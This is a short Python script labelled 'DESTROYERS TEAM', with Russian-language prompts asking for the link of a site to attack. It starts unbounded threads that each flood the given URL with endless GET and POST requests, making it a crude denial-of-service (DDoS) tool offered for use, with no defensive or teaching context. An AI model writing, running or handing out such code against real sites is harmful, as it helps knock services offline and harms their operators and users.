import threading
import requests

print("🅳🅴🆂🆃🆁🅾🆈🅴🆁🆂 🆃🅴🅰🅼")

targ = input("Введите ссылку на сайт для атаки: ")

def ddos():
 while True:
  requests.post(targ)
  requests.get(targ)
  print("[+] Заход на сайт выполнен!")
  
while True:
 threading.Thread(target=ddos).start()
